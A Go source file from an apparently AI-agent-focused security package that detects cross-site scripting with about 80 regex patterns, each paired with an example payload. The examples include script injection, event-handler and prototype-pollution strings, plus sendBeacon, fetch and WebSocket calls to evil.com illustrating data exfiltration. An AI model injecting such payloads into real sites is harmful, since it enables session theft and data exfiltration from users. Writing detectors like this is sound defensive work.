// Copyright 2025-2026 TakeInterest Inc.
// SPDX-License-Identifier: Apache-2.0

// Package security provides XSS (Cross-Site Scripting) detection for AI agents
// that receive or process user-supplied HTML/JavaScript content.
package security

import (
	"regexp"
	"strings"
)

// XSSCategory categorizes XSS attack types.
type XSSCategory string

const (
	XSSCategoryScriptTag      XSSCategory = "script_tag"
	XSSCategoryEventHandler   XSSCategory = "event_handler"
	XSSCategorySVG            XSSCategory = "svg_payload"
	XSSCategoryDataURI        XSSCategory = "data_uri"
	XSSCategoryDOMBased       XSSCategory = "dom_based"
	XSSCategoryPolyglot       XSSCategory = "polyglot"
	XSSCategoryEncoded        XSSCategory = "encoded_xss"
	XSSCategoryTemplate       XSSCategory = "template_injection"
	XSSCategoryMutationXSS    XSSCategory = "mutation_xss"
	XSSCategoryCSPBypass      XSSCategory = "csp_bypass"
	XSSCategoryDOMSink        XSSCategory = "dom_sink"
	XSSCategoryProtoPollution XSSCategory = "prototype_pollution"
	XSSCategoryEncodingEvade  XSSCategory = "encoding_evasion"
)

// XSSPattern represents an XSS detection pattern.
type XSSPattern struct {
	Pattern    *regexp.Regexp
	Category   XSSCategory
	Severity   float64 // 0.0-1.0
	Confidence float64 // 0.0-1.0
	Name       string
	Example    string
}

// XSSPatterns contains comprehensive XSS detection patterns.
// Total: 40 patterns across 8 categories.
var XSSPatterns = []XSSPattern{
	// === Script Tag Injection (8 patterns) ===
	{regexp.MustCompile(`(?i)<script[\s>]`), XSSCategoryScriptTag, 0.95, 0.95, "script_tag_open", `<script>alert(1)</script>`},
	{regexp.MustCompile(`(?i)</script>`), XSSCategoryScriptTag, 0.90, 0.90, "script_tag_close", `</script>`},
	{regexp.MustCompile(`(?i)<script[^>]*src\s*=`), XSSCategoryScriptTag, 0.95, 0.95, "script_src", `<script src=http://evil.com/xss.js>`},
	{regexp.MustCompile(`(?i)<script[^>]*\btype\s*=\s*["']?text/javascript`), XSSCategoryScriptTag, 0.90, 0.90, "script_type_js", `<script type="text/javascript">`},
	{regexp.MustCompile(`(?i)<iframe[^>]*src\s*=`), XSSCategoryScriptTag, 0.85, 0.85, "iframe_injection", `<iframe src="javascript:alert(1)">`},
	{regexp.MustCompile(`(?i)<object[^>]*data\s*=`), XSSCategoryScriptTag, 0.80, 0.80, "object_data", `<object data="javascript:alert(1)">`},
	{regexp.MustCompile(`(?i)<embed[^>]*src\s*=`), XSSCategoryScriptTag, 0.80, 0.80, "embed_src", `<embed src="javascript:alert(1)">`},
	{regexp.MustCompile(`(?i)<link[^>]*href\s*=\s*["']?javascript:`), XSSCategoryScriptTag, 0.90, 0.85, "link_javascript", `<link href="javascript:alert(1)">`},

	// === Event Handler Injection (8 patterns) ===
	{regexp.MustCompile(`(?i)\bon\w+\s*=\s*["']?[^"']*(?:alert|confirm|prompt|eval|Function)\s*\(`), XSSCategoryEventHandler, 0.95, 0.90, "event_handler_exec", `onload=alert(1)`},
	// Require the handler to sit inside an HTML tag (<... onX=...) so benign JS like
	// `const onError = ...` or a React `onClick={fn}` prop is not flagged; only
	// inline HTML event-handler attributes (the actual XSS vector) match.
	{regexp.MustCompile(`(?i)<[a-z][^>]*\bonerror\s*=`), XSSCategoryEventHandler, 0.90, 0.85, "onerror_handler", `<img onerror=alert(1)>`},
	{regexp.MustCompile(`(?i)<[a-z][^>]*\bonload\s*=`), XSSCategoryEventHandler, 0.85, 0.80, "onload_handler", `<body onload=alert(1)>`},
	{regexp.MustCompile(`(?i)<[a-z][^>]*\bonmouseover\s*=`), XSSCategoryEventHandler, 0.80, 0.80, "onmouseover_handler", `<div onmouseover=alert(1)>`},
	{regexp.MustCompile(`(?i)<[a-z][^>]*\bonfocus\s*=`), XSSCategoryEventHandler, 0.80, 0.80, "onfocus_handler", `<input onfocus=alert(1)>`},
	{regexp.MustCompile(`(?i)\bonclick\s*=\s*["']?[^"']*(?:document|window|location|eval)\b`), XSSCategoryEventHandler, 0.90, 0.85, "onclick_dangerous", `onclick="document.location='http://evil.com'"`},
	{regexp.MustCompile(`(?i)\bonanimationstart\s*=`), XSSCategoryEventHandler, 0.80, 0.75, "onanimationstart", `<div onanimationstart=alert(1)>`},
	{regexp.MustCompile(`(?i)\bontoggle\s*=`), XSSCategoryEventHandler, 0.80, 0.75, "ontoggle_handler", `<details ontoggle=alert(1)>`},

	// === SVG Payload (4 patterns) ===
	{regexp.MustCompile(`(?i)<svg[^>]*on\w+\s*=`), XSSCategorySVG, 0.95, 0.90, "svg_event_handler", `<svg onload=alert(1)>`},
	{regexp.MustCompile(`(?i)<svg[^>]*>.*?<script`), XSSCategorySVG, 0.95, 0.90, "svg_embedded_script", `<svg><script>alert(1)</script></svg>`},
	{regexp.MustCompile(`(?i)<math[^>]*>.*?<m(?:action|row)[^>]*(?:actiontype|href)\s*=\s*["']?javascript:`), XSSCategorySVG, 0.90, 0.85, "mathml_xss", `<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">`},
	{regexp.MustCompile(`(?i)<animate[^>]*(?:attributeName|values)\s*=.*?javascript:`), XSSCategorySVG, 0.85, 0.80, "svg_animate_xss", `<animate attributeName="href" values="javascript:alert(1)">`},

	// === Data URI (4 patterns) ===
	{regexp.MustCompile(`(?i)(?:href|src|action)\s*=\s*["']?\s*data:\s*text/html`), XSSCategoryDataURI, 0.95, 0.90, "data_uri_html", `href="data:text/html,<script>alert(1)</script>"`},
	{regexp.MustCompile(`(?i)(?:href|src)\s*=\s*["']?\s*javascript:`), XSSCategoryDataURI, 0.95, 0.95, "javascript_uri", `href="javascript:alert(1)"`},
	{regexp.MustCompile(`(?i)data:\s*(?:text/html|application/xhtml);base64,`), XSSCategoryDataURI, 0.90, 0.85, "data_uri_base64", `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`},
	{regexp.MustCompile(`(?i)(?:href|src)\s*=\s*["']?\s*(?:vbscript|mocha|livescript):`), XSSCategoryDataURI, 0.90, 0.90, "legacy_script_uri", `href="vbscript:MsgBox(1)"`},

	// === DOM-Based XSS (5 patterns) ===
	{regexp.MustCompile(`(?i)document\.(?:write|writeln)\s*\(`), XSSCategoryDOMBased, 0.85, 0.80, "document_write", `document.write(userInput)`},
	{regexp.MustCompile(`(?i)\.innerHTML\s*=`), XSSCategoryDOMBased, 0.80, 0.75, "innerhtml_assignment", `element.innerHTML = userInput`},
	{regexp.MustCompile(`(?i)\.outerHTML\s*=`), XSSCategoryDOMBased, 0.80, 0.75, "outerhtml_assignment", `element.outerHTML = userInput`},
	{regexp.MustCompile(`(?i)(?:eval|Function|setTimeout|setInterval)\s*\(\s*(?:["']|` + "`" + `)?[^)]*(?:document|window|location)`), XSSCategoryDOMBased, 0.95, 0.85, "eval_dom_access", `eval("document.cookie")`},
	{regexp.MustCompile(`(?i)\.insertAdjacentHTML\s*\(`), XSSCategoryDOMBased, 0.80, 0.75, "insert_adjacent_html", `element.insertAdjacentHTML('beforeend', userInput)`},

	// === Polyglot / Evasion (5 patterns) ===
	{regexp.MustCompile(`(?i)javas\x00cript:`), XSSCategoryPolyglot, 0.95, 0.90, "null_byte_javascript", "javas\x00cript:alert(1)"},
	{regexp.MustCompile(`(?i)java(?:\s|%09|%0a|%0d)+script:`), XSSCategoryPolyglot, 0.95, 0.90, "whitespace_javascript", `java\tscript:alert(1)`},
	{regexp.MustCompile(`(?i)&#(?:x6a|106);ava(?:&#(?:x73|115);)cript:`), XSSCategoryPolyglot, 0.90, 0.85, "html_entity_javascript", `&#x6a;avascript:alert(1)`},
	{regexp.MustCompile(`(?i)<[^>]+style\s*=\s*["'][^"']*expression\s*\(`), XSSCategoryPolyglot, 0.90, 0.85, "css_expression", `<div style="width:expression(alert(1))">`},
	{regexp.MustCompile(`(?i)<[^>]+style\s*=\s*["'][^"']*(?:url|import)\s*\(\s*["']?javascript:`), XSSCategoryPolyglot, 0.90, 0.85, "css_url_javascript", `<div style="background:url(javascript:alert(1))">`},

	// === Encoded XSS (3 patterns) ===
	{regexp.MustCompile(`%3[Cc]script`), XSSCategoryEncoded, 0.90, 0.85, "url_encoded_script", `%3Cscript%3Ealert(1)%3C/script%3E`},
	{regexp.MustCompile(`(?i)\\u003[Cc]script`), XSSCategoryEncoded, 0.90, 0.85, "unicode_escaped_script", `\u003cscript\u003e`},
	{regexp.MustCompile(`(?i)&lt;\s*script`), XSSCategoryEncoded, 0.70, 0.70, "html_entity_script", `&lt;script&gt;`},

	// === Template Injection (3 patterns) ===
	{regexp.MustCompile(`\{\{.*?(?:constructor|__proto__|prototype)\b`), XSSCategoryTemplate, 0.90, 0.85, "template_prototype_pollution", `{{constructor.constructor('alert(1)')()`},
	{regexp.MustCompile(`\$\{.*?(?:document|window|global|process)\b`), XSSCategoryTemplate, 0.85, 0.80, "template_literal_xss", "${document.cookie}"},
	{regexp.MustCompile(`(?i)<%.*?(?:response\.write|eval)\b`), XSSCategoryTemplate, 0.90, 0.85, "server_template_xss", `<%=response.write(request.querystring("xss"))%>`},

	// === Mutation XSS (10 patterns) ===
	{regexp.MustCompile(`(?i)<noscript[^>]*>.*?<`), XSSCategoryMutationXSS, 0.85, 0.80, "noscript_escape", `<noscript><img src=x onerror=alert(1)></noscript>`},
	{regexp.MustCompile(`(?i)<math[^>]*>.*?<m(?:text|row|i)\b`), XSSCategoryMutationXSS, 0.85, 0.80, "mathml_injection", `<math><mtext><script>alert(1)</script></mtext></math>`},
	{regexp.MustCompile(`(?i)<table[^>]*>.*?<form\b`), XSSCategoryMutationXSS, 0.80, 0.75, "table_form_mutation", `<table><form action=evil>`},
	{regexp.MustCompile(`(?i)<select[^>]*>.*?<`), XSSCategoryMutationXSS, 0.75, 0.70, "select_escape", `<select><option><img src=x onerror=alert(1)>`},
	{regexp.MustCompile(`(?i)<style[^>]*>.*?</style[^>]*>.*?<`), XSSCategoryMutationXSS, 0.85, 0.80, "style_context_escape", `<style></style><script>alert(1)</script>`},
	{regexp.MustCompile(`(?i)<title[^>]*>.*?</title[^>]*>.*?<`), XSSCategoryMutationXSS, 0.80, 0.75, "title_context_escape", `<title></title><script>alert(1)</script>`},
	{regexp.MustCompile(`(?i)<textarea[^>]*>.*?</textarea[^>]*>.*?<`), XSSCategoryMutationXSS, 0.80, 0.75, "textarea_context_escape", `<textarea></textarea><script>alert(1)</script>`},
	{regexp.MustCompile(`(?i)<noembed[^>]*>`), XSSCategoryMutationXSS, 0.80, 0.75, "noembed_element", `<noembed><img src=x onerror=alert(1)></noembed>`},
	{regexp.MustCompile(`(?i)<noframes[^>]*>`), XSSCategoryMutationXSS, 0.80, 0.75, "noframes_element", `<noframes><img src=x onerror=alert(1)></noframes>`},
	{regexp.MustCompile(`(?i)<xmp[^>]*>`), XSSCategoryMutationXSS, 0.80, 0.75, "xmp_element", `<xmp><img src=x onerror=alert(1)></xmp>`},

	// === CSP Bypass (8 patterns) ===
	{regexp.MustCompile(`(?i)<base\s+href\s*=`), XSSCategoryCSPBypass, 0.90, 0.85, "base_href_hijack", `<base href="https://evil.com/">`},
	{regexp.MustCompile(`(?i)<meta\s+http-equiv\s*=\s*["']?refresh`), XSSCategoryCSPBypass, 0.85, 0.80, "meta_refresh", `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`},
	{regexp.MustCompile(`(?i)<link\s+rel\s*=\s*["']?(?:preload|prefetch|preconnect)\b`), XSSCategoryCSPBypass, 0.75, 0.70, "link_preload_prefetch", `<link rel="preload" href="https://evil.com/">`},
	{regexp.MustCompile(`(?i)\bimportScripts\s*\(`), XSSCategoryCSPBypass, 0.90, 0.85, "importscripts", `importScripts('https://evil.com/sw.js')`},
	{regexp.MustCompile(`(?i)\bnavigator\.sendBeacon\s*\(`), XSSCategoryCSPBypass, 0.85, 0.80, "navigator_sendbeacon", `navigator.sendBeacon('https://evil.com/', data)`},
	{regexp.MustCompile(`(?i)\bnew\s+WebSocket\s*\(`), XSSCategoryCSPBypass, 0.85, 0.80, "new_websocket", `new WebSocket('wss://evil.com/')`},
	{regexp.MustCompile(`(?i)\bnew\s+EventSource\s*\(`), XSSCategoryCSPBypass, 0.80, 0.75, "new_eventsource", `new EventSource('https://evil.com/')`},
	{regexp.MustCompile(`(?i)\bfetch\s*\([^)]*\)\s*\.\s*then\b`), XSSCategoryCSPBypass, 0.75, 0.70, "fetch_then", `fetch('https://evil.com/').then(r=>r.text())`},

	// === Modern DOM Sinks (8 patterns) ===
	{regexp.MustCompile(`(?i)\.setHTMLUnsafe\s*\(`), XSSCategoryDOMSink, 0.90, 0.85, "sethtml_unsafe", `el.setHTMLUnsafe(userInput)`},
	{regexp.MustCompile(`(?i)DOMParser.*parseFromString`), XSSCategoryDOMSink, 0.80, 0.75, "domparser_parsefromstring", `new DOMParser().parseFromString(html, 'text/html')`},
	{regexp.MustCompile(`(?i)createContextualFragment\s*\(`), XSSCategoryDOMSink, 0.85, 0.80, "create_contextual_fragment", `range.createContextualFragment(html)`},
	{regexp.MustCompile(`(?i)\.srcdoc\s*=`), XSSCategoryDOMSink, 0.85, 0.80, "iframe_srcdoc", `iframe.srcdoc = userInput`},
	{regexp.MustCompile(`(?i)Blob\s*\(\s*\[.*?\]\s*,\s*\{.*?text/html`), XSSCategoryDOMSink, 0.85, 0.80, "blob_text_html", `new Blob([html], {type: 'text/html'})`},
	{regexp.MustCompile(`(?i)URL\.createObjectURL\s*\(`), XSSCategoryDOMSink, 0.75, 0.70, "createobjecturl", `URL.createObjectURL(blob)`},
	{regexp.MustCompile(`(?i)createHTMLDocument\s*\(`), XSSCategoryDOMSink, 0.80, 0.75, "create_html_document", `document.implementation.createHTMLDocument()`},
	{regexp.MustCompile(`(?i)\.replaceChildren\s*\(`), XSSCategoryDOMSink, 0.70, 0.65, "replace_children", `el.replaceChildren(unsafeNode)`},

	// === Prototype Pollution (7 patterns) ===
	{regexp.MustCompile(`(?i)__proto__\s*[=\[]`), XSSCategoryProtoPollution, 0.95, 0.90, "proto_assignment", `obj.__proto__ = payload`},
	{regexp.MustCompile(`(?i)constructor\s*\[\s*["']prototype["']\s*\]`), XSSCategoryProtoPollution, 0.95, 0.90, "constructor_prototype_bracket", `obj.constructor["prototype"].x = evil`},
	{regexp.MustCompile(`(?i)Object\.assign\s*\(.*?__proto__`), XSSCategoryProtoPollution, 0.90, 0.85, "object_assign_proto", `Object.assign({}, {__proto__: {evil: true}})`},
	{regexp.MustCompile(`(?i)Object\.setPrototypeOf\s*\(`), XSSCategoryProtoPollution, 0.85, 0.80, "set_prototype_of", `Object.setPrototypeOf(obj, evil)`},
	{regexp.MustCompile(`(?i)\.prototype\.\w+\s*=`), XSSCategoryProtoPollution, 0.80, 0.75, "prototype_property_set", `Object.prototype.toString = evil`},
	{regexp.MustCompile(`(?i)Object\.defineProperty\s*\(.*?__proto__`), XSSCategoryProtoPollution, 0.90, 0.85, "define_property_proto", `Object.defineProperty({}.__proto__, 'x', {value: evil})`},
	{regexp.MustCompile(`(?i)JSON\.parse\s*\(.*?__proto__`), XSSCategoryProtoPollution, 0.90, 0.85, "json_parse_proto", `JSON.parse('{"__proto__": {"evil": true}}')`},

	// === Encoding Evasion / Legacy Elements (7 patterns) ===
	{regexp.MustCompile(`(?i)<\s+script`), XSSCategoryEncodingEvade, 0.85, 0.80, "space_after_angle", `< script>alert(1)</script>`},
	{regexp.MustCompile(`(?i)<img/src[=/]`), XSSCategoryEncodingEvade, 0.90, 0.85, "self_closing_trick", `<img/src=x/onerror=alert(1)>`},
	{regexp.MustCompile(`(?i)<[^>]+style\s*=\s*["'][^"']*url\s*\(`), XSSCategoryEncodingEvade, 0.85, 0.80, "css_url_injection", `<div style="background:url(evil)">`},
	{regexp.MustCompile(`(?i)<isindex\b`), XSSCategoryEncodingEvade, 0.80, 0.75, "isindex_element", `<isindex action=javascript:alert(1)>`},
	{regexp.MustCompile(`(?i)<marquee\s+on\w+\s*=`), XSSCategoryEncodingEvade, 0.85, 0.80, "marquee_event", `<marquee onstart=alert(1)>`},
	{regexp.MustCompile(`(?i)<video\s+[^>]*on\w+\s*=`), XSSCategoryEncodingEvade, 0.85, 0.80, "video_event", `<video onerror=alert(1)>`},
	{regexp.MustCompile(`(?i)<audio\s+[^>]*on\w+\s*=`), XSSCategoryEncodingEvade, 0.85, 0.80, "audio_event", `<audio onerror=alert(1)>`},
}

// CheckXSS checks input for XSS patterns and returns all findings.
func CheckXSS(input string) []XSSFinding {
	if len(input) == 0 {
		return nil
	}

	var findings []XSSFinding
	lower := strings.ToLower(input)

	// Quick pre-filter: skip if no HTML-like or script-like content
	if !strings.ContainsAny(lower, "<>\"'=(){}$%&") {
		return nil
	}

	for i := range XSSPatterns {
		p := &XSSPatterns[i]
		if p.Pattern.MatchString(input) {
			findings = append(findings, XSSFinding{
				Pattern:    p,
				MatchedStr: p.Pattern.FindString(input),
			})
		}
	}
	return findings
}

// XSSFinding represents a matched XSS pattern.
type XSSFinding struct {
	Pattern    *XSSPattern
	MatchedStr string
}
